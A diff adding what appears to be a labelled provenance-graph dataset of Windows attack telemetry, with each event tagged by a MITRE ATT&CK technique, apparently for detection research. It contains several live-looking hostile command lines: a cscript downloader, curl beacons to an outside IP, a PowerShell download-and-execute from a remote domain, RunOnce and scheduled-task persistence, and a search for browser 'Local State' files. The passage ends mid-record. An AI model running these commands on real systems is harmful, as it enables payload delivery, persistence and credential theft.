@@ -1,0 +1,4335 @@
+{
+    "srcNode": {
+        "UUID": "2d97c036-3333-55df-93b6-76a766831c3b",
+        "Name": "chrome.exe",
+        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Cmdline": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Pid": 6306,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0945eb84-2203-598e-9948-dfe991f09330",
+        "Srcaddress": "desktop-85.zuniga.com",
+        "Dstaddress": "8.8.8.8",
+        "Port": "28877",
+        "Type": "Network"
+    },
+    "relation": "TCP Connect",
+    "timestamp": 1655180399,
+    "label": "T1566.001_1afaec09315ab71fdfb167175e8a019a"
+}
+{
+    "srcNode": {
+        "UUID": "2d97c036-3333-55df-93b6-76a766831c3b",
+        "Name": "chrome.exe",
+        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Cmdline": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Pid": 6306,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "9e4e1a93-47ab-5738-b2ff-b0c002ced25b",
+        "Name": "rFupMb75.exe",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655180399,
+    "label": "T1566.001_1afaec09315ab71fdfb167175e8a019a"
+}
+{
+    "srcNode": {
+        "UUID": "2d97c036-3333-55df-93b6-76a766831c3b",
+        "Name": "chrome.exe",
+        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Cmdline": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "Pid": 6306,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0945eb84-2203-598e-9948-dfe991f09330",
+        "Srcaddress": "desktop-85.zuniga.com",
+        "Dstaddress": "8.8.8.8",
+        "Port": "28877",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655180399,
+    "label": "T1566.001_1afaec09315ab71fdfb167175e8a019a"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "9e4e1a93-47ab-5738-b2ff-b0c002ced25b",
+        "Name": "rFupMb75.exe",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655180400,
+    "label": "T1204.002_522f3f35cd013e63830fa555495a0081"
+}
+{
+    "srcNode": {
+        "UUID": "5ccf56d0-767b-5018-b055-8d9201673e60",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C echo var url = \"http://ocsp.digicert.com/MFYwVKADAgEAME0wSzBJMAkGBSsOAwIaBQAEFN+qEuMosQlBk+KfQoLOR0BClVijBBSxPsNpA/i/RwHUmCYaCALvY2QrwwIQBxd5EQBdImf2iJL2j4tQWA==\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > Retrive4075693065230196915.vbs && cscript //E:Jscript Retrive4075693065230196915.vbs",
+        "Type": "Process",
+        "Pid": 3616
+    },
+    "dstNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Type": "Process",
+        "Pid": 5992
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180404,
+    "label": "T1204.002_522f3f35cd013e63830fa555495a0081"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Type": "Process",
+        "Pid": 5992
+    },
+    "dstNode": {
+        "UUID": "16c21c98-93f1-503a-927d-fed434c16743",
+        "Name": "Retrive4075693065230196915.vbs",
+        "Type": "File"
+    },
+    "relation": "ReadFile",
+    "timestamp": 1655180405,
+    "label": "T1204.002_522f3f35cd013e63830fa555495a0081"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "47efb7a2-7855-58e4-bece-dba1b1ed1a23",
+        "Name": "C:\\Users\\vhodges\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sllauncherENU.dll (copy).lnk",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655180405,
+    "label": "T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "47efb7a2-7855-58e4-bece-dba1b1ed1a23",
+        "Name": "C:\\Users\\vhodges\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sllauncherENU.dll (copy).lnk",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655180405,
+    "label": "T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "47efb7a2-7855-58e4-bece-dba1b1ed1a23",
+        "Name": "C:\\Users\\vhodges\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sllauncherENU.dll (copy).lnk",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655180405,
+    "label": "T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ae05e154-c07d-54b7-9997-376ba04a22e3",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "$PSVersionTable",
+        "Type": "Process",
+        "Pid": 9836
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180405,
+    "label": "T1082_29451844-9b76-4e16-a9ee-d6feab4b24db"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "06335eda-7198-5698-a368-523d701bc8a1",
+        "Name": "ipconfig.exe",
+        "Image": "C:\\Windows\\system32\\ipconfig.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\ipconfig.exe\"",
+        "Type": "Process",
+        "Pid": 1992
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180405,
+    "label": "T1016_e8017c46-acb8-400c-a4b5-b3362b5b5baa"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "3a91904a-ab14-5b99-bb6e-87a13af812a9",
+        "Name": "sc.exe",
+        "Image": "C:\\Windows\\system32\\sc.exe",
+        "Cmdline": "sc create win32times binPath= \"sllauncherENU.dll (copy)\"",
+        "Type": "Process",
+        "Pid": 200
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180405,
+    "label": "T1036.004_1f0614ea5c4af6faf1b44570f5f22f8a"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ec4e3272-ecaf-522f-9e6b-2f14d9fecd0e",
+        "Name": "schtasks.exe",
+        "Image": "C:\\Windows\\system32\\schtasks.exe",
+        "Cmdline": "SCHTASKS /Create /SC ONCE /TN WinHttpAutoProxySvc /TR sllauncherENU.dll (copy) /ST e",
+        "Type": "Process",
+        "Pid": 10084
+    },
+    "relation": "Process Create",
+    "timestamp": 1655180405,
+    "label": "T1053.005_ee454be9197890de62705ce6255933fd"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "a895af49-5690-5428-824a-00c608503522",
+        "Name": "cmdkey.exe",
+        "Image": "C:\\Windows\\system32\\cmdkey.exe",
+        "Cmdline": "cmdkey.exe  /list ",
+        "Type": "Process",
+        "Pid": 784
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179074,
+    "label": "T1087.001_6334877e8e3ba48f7835d4856d90a282"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "b4a73661-dead-5329-b08e-967d59728e54",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C dir",
+        "Type": "Process",
+        "Pid": 3108
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179074,
+    "label": "T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8"
+}
+{
+    "srcNode": {
+        "UUID": "b4a73661-dead-5329-b08e-967d59728e54",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C dir",
+        "Type": "Process",
+        "Pid": 3108
+    },
+    "dstNode": {
+        "UUID": "66abcf95-1222-525c-9697-8bfab19fc03e",
+        "Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655179076,
+    "label": "T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8"
+}
+{
+    "srcNode": {
+        "UUID": "b4a73661-dead-5329-b08e-967d59728e54",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C dir",
+        "Type": "Process",
+        "Pid": 3108
+    },
+    "dstNode": {
+        "UUID": "4194ee3b-4990-5fdb-8b4f-fd6b6160076a",
+        "Name": "C:\\Windows\\System32",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655179076,
+    "label": "T1083_52177cc1-b9ab-4411-ac21-2eadc4b5d3b8"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "34c9869f-9396-5a7d-a0a6-bc4420ce2087",
+        "Name": "net.exe",
+        "Image": "C:\\Windows\\system32\\net.exe",
+        "Cmdline": "net  localgroup \"Administrators\"",
+        "Type": "Process",
+        "Pid": 1560
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179078,
+    "label": "T1069.001_a1f48fa3ddee658b29b414523c9a295b"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "5b5ad7b9-ebb8-5b03-90c1-1b5f0daa34d1",
+        "Name": "ARP.EXE",
+        "Image": "C:\\Windows\\system32\\ARP.EXE",
+        "Cmdline": "arp  -a ",
+        "Type": "Process",
+        "Pid": 5876
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179078,
+    "label": "T1016_7d8ee68f0e9731db82964f558f614608"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "86f0d70a-8372-5511-aec1-d6e61dd7afde",
+        "Name": "NETSTAT.EXE",
+        "Image": "C:\\Windows\\system32\\NETSTAT.EXE",
+        "Cmdline": "\"C:\\Windows\\system32\\NETSTAT.EXE\" -anto",
+        "Type": "Process",
+        "Pid": 10680
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179078,
+    "label": "T1049_638fb6bb-ba39-4285-93d1-7e4775b033a8"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"Retrive4075693065230196915.vbs\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "2697204b-63da-5afe-a125-2ad2e2c256df",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C net.exe start >> c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt",
+        "Type": "Process",
+        "Pid": 9532
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179078,
+    "label": "T1007_9d03c91bdae5a80f17f89c987942b5a8"
+}
+{
+    "srcNode": {
+        "UUID": "2697204b-63da-5afe-a125-2ad2e2c256df",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C net.exe start >> c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt",
+        "Type": "Process",
+        "Pid": 9532
+    },
+    "dstNode": {
+        "UUID": "da39907e-aeef-5023-9e29-0aa4155a0a1c",
+        "Name": "net.exe",
+        "Image": "C:\\Windows\\system32\\net.exe",
+        "Cmdline": "net.exe  start ",
+        "Type": "Process",
+        "Pid": 9008
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179079,
+    "label": "T1007_9d03c91bdae5a80f17f89c987942b5a8"
+}
+{
+    "srcNode": {
+        "UUID": "29c1389b-e953-5777-b3af-5f2eb215add4",
+        "Name": "net1.exe",
+        "Image": "C:\\Windows\\system32\\net1.exe",
+        "Cmdline": "C:\\Windows\\system32\\net1  start ",
+        "Type": "Process",
+        "Pid": 10524
+    },
+    "dstNode": {
+        "UUID": "984ebc22-9624-51ce-88a0-6b1236ef318a",
+        "Name": "c:\\users\\administrator\\appdata\\local\\temp\\werd9cd.tmp.appcompat.txt",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655179082,
+    "label": "T1007_9d03c91bdae5a80f17f89c987942b5a8"
+}
+{
+    "srcNode": {
+        "UUID": "3df84aab-030e-529b-9c64-a6ab377de9a8",
+        "Name": "WinRAR.exe",
+        "Image": "C:\\Program Files\\WinRAR\\WinRAR.exe",
+        "Cmdline": "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\apple\\Downloads\\IOC_09_11.rar\"",
+        "Pid": 49638,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c31d9282-e984-5d34-bc75-16daed409c95",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 43.207.106.74 >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 43.207.106.74 >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 43.207.106.74 >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 43.207.106.74 >nul 2>&1",
+        "Type": "Process",
+        "Pid": 9308
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245736,
+    "label": "T1071.001_24c3b7b004401d839a5c337201da3484"
+}
+{
+    "srcNode": {
+        "UUID": "516a7976-b346-5ed4-9071-70ac3dadace3",
+        "Name": "curl.exe",
+        "Image": "C:\\Windows\\System32\\curl.exe",
+        "Cmdline": "C:\\Windows\\System32\\Curl.exe  -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 43.207.106.74  ",
+        "Type": "Process",
+        "Pid": 7608
+    },
+    "dstNode": {
+        "UUID": "14eac5d2-4f6a-5aa1-a3a6-98c1de9ea6eb",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "43.207.106.74",
+        "Port": "57304",
+        "Type": "Network"
+    },
+    "relation": "TCP Send",
+    "timestamp": 1655245743,
+    "label": "T1071.001_24c3b7b004401d839a5c337201da3484"
+}
+{
+    "srcNode": {
+        "UUID": "7292bc2f-1403-524b-bde1-e74d35ccefe3",
+        "Name": "curl.exe",
+        "Image": "C:\\Windows\\System32\\curl.exe",
+        "Cmdline": "C:\\Windows\\System32\\Curl.exe  -s -A \"*<|>*\" -m3 43.207.106.74 ",
+        "Type": "Process",
+        "Pid": 11240
+    },
+    "dstNode": {
+        "UUID": "14eac5d2-4f6a-5aa1-a3a6-98c1de9ea6eb",
+        "Srcaddress": "DESKTOP-BA1RQFC.blueteam.com",
+        "Dstaddress": "43.207.106.74",
+        "Port": "57306",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655245746,
+    "label": "T1071.001_24c3b7b004401d839a5c337201da3484"
+}
+{
+    "srcNode": {
+        "UUID": "3df84aab-030e-529b-9c64-a6ab377de9a8",
+        "Name": "WinRAR.exe",
+        "Image": "C:\\Program Files\\WinRAR\\WinRAR.exe",
+        "Cmdline": "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\apple\\Downloads\\IOC_09_11.rar\"",
+        "Pid": 49638,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "1a31224e-42bf-544a-9d3b-e4b589810d46",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \\\"Local State\\\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;\"",
+        "Type": "Process",
+        "Pid": 8660
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245753,
+    "label": "T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5"
+}
+{
+    "srcNode": {
+        "UUID": "1a31224e-42bf-544a-9d3b-e4b589810d46",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \\\"Local State\\\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;\"",
+        "Type": "Process",
+        "Pid": 8660
+    },
+    "dstNode": {
+        "UUID": "3e31bc89-350f-5458-8508-c874f642566c",
+        "Name": "C:\\Users\\lmelendez\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\felcaaldnbdncclmgdcncolpebgiejap\\1.2_0\\_locales\\hu\\Local State",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655245754,
+    "label": "T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5"
+}
+{
+    "srcNode": {
+        "UUID": "1a31224e-42bf-544a-9d3b-e4b589810d46",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-ChildItem C:\\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \\\"Local State\\\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;\"",
+        "Type": "Process",
+        "Pid": 8660
+    },
+    "dstNode": {
+        "UUID": "beea3223-68dc-5dfc-b476-7e80c73f2a88",
+        "Name": "C:\\Users\\apple\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655245754,
+    "label": "T1005_720a3356-eee1-4015-9135-0fc08f7eb2d5"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"67250d5e5cb42df505b278e53ae346e7573ba60a06c3daac7ec05f853100e61c.bin\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "beea3223-68dc-5dfc-b476-7e80c73f2a88",
+        "Name": "C:\\Users\\apple\\Downloads\\output.json",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655245755,
+    "label": "T1567_3d3d378b0bf66f763b0c9d7a129eb130"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"67250d5e5cb42df505b278e53ae346e7573ba60a06c3daac7ec05f853100e61c.bin\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f8c2d1d3-62b4-5520-a2a9-682bfdc20e1e",
+        "Srcaddress": "DESKTOP-589U7QT.iis.sinica.edu.tw",
+        "Dstaddress": "166.62.27.56",
+        "Port": "329",
+        "Type": "Network"
+    },
+    "relation": "TCP Receive",
+    "timestamp": 1655245755,
+    "label": "T1567_3d3d378b0bf66f763b0c9d7a129eb130"
+}
+{
+    "srcNode": {
+        "UUID": "7a29affb-00d4-5a9a-89d2-3f3af08cf937",
+        "Name": "cscript.exe",
+        "Image": "C:\\Windows\\system32\\cscript.exe",
+        "Cmdline": "cscript //E:Jscript \"67250d5e5cb42df505b278e53ae346e7573ba60a06c3daac7ec05f853100e61c.bin\"",
+        "Pid": 5992,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f8c2d1d3-62b4-5520-a2a9-682bfdc20e1e",
+        "Srcaddress": "DESKTOP-589U7QT.iis.sinica.edu.tw",
+        "Dstaddress": "166.62.27.56",
+        "Port": "329",
+        "Type": "Network"
+    },
+    "relation": "TCP Send",
+    "timestamp": 1655245755,
+    "label": "T1567_3d3d378b0bf66f763b0c9d7a129eb130"
+}
+{
+    "srcNode": {
+        "UUID": "53f2fb2f-de87-5fbe-8add-52b5762c2773",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 19956,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==') | Out-File \\\"2021.12.01(1)\\\"; Invoke-Item \\\"2021.12.01(1)\\\"\"",
+        "Type": "Process",
+        "Pid": 3760
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174298,
+    "label": "T1105_0856c235a1d26113d4f2d92e39c9a9f8"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==') | Out-File \\\"2021.12.01(1)\\\"; Invoke-Item \\\"2021.12.01(1)\\\"\"",
+        "Type": "Process",
+        "Pid": 3760
+    },
+    "dstNode": {
+        "UUID": "6a0ec0aa-f202-520d-b0d5-285b9e15311f",
+        "Name": "2021.12.01(1)",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655174299,
+    "label": "T1105_0856c235a1d26113d4f2d92e39c9a9f8"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==') | Out-File \\\"2021.12.01(1)\\\"; Invoke-Item \\\"2021.12.01(1)\\\"\"",
+        "Type": "Process",
+        "Pid": 3760
+    },
+    "dstNode": {
+        "UUID": "6a0ec0aa-f202-520d-b0d5-285b9e15311f",
+        "Name": "2021.12.01(1):Zone.Identifier",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655174299,
+    "label": "T1105_0856c235a1d26113d4f2d92e39c9a9f8"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://eresourcesmoneymarket.com/JbVwdgaV6l/P34KJnkbASUWPzEYIgcWQnt7Yn9leGV9eg==') | Out-File \\\"2021.12.01(1)\\\"; Invoke-Item \\\"2021.12.01(1)\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c237cb94-01b4-5e34-ac78-5dba7c28a71d",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunOnceKey = \\\"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\"; set-itemproperty $RunOnceKey \\\"NextRun\\\" 2021.12.01(1)\"",
+        "Type": "Process",
+        "Pid": 3136
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174299,
+    "label": "T1547.001_4b71ebb2f6f6a01235ba240fa40ce978"
+}
+{
+    "srcNode": {
+        "UUID": "c237cb94-01b4-5e34-ac78-5dba7c28a71d",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
